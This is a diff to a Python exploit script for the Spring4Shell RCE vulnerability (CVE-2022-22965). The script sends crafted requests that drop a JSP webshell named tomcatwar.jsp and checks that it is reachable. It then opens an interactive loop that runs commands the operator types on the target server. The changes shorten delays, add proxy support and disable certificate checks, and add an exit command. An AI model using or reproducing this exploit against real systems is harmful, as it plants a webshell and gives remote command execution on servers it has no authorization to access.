@@ -35,18 +35,20 @@ def CVE_2022_22965(url, proxies):
     try:
         requests.packages.urllib3.disable_warnings()
         requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        sleep(1)
+        sleep(0.5)
         requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        sleep(1)
+        sleep(0.5)
         requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        sleep(1)
-        test = requests.get(url + "tomcatwar.jsp")
+        sleep(0.5)
+        test = requests.get(url + "tomcatwar.jsp", verify=False, proxies=proxies)
         if (test.status_code == 200) and ('aabysszg' in str(test.text)):
             cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami" ,"red")
             while 1:
-                cmd = input("[+] 请输入要执行的命令>>> ")
-                url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
-                r = requests.get(url_shell)
+                Cmd = input("[+] 请输入要执行的命令>>> ")
+                if Cmd == "exit":
+                    sys.exit(0)
+                url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(Cmd)
+                r = requests.get(url_shell, verify=False, proxies=proxies)
                 resp = r.text
                 result = re.findall('([^\x00]+)\n', resp)[0]
                 cprint(result ,"green")
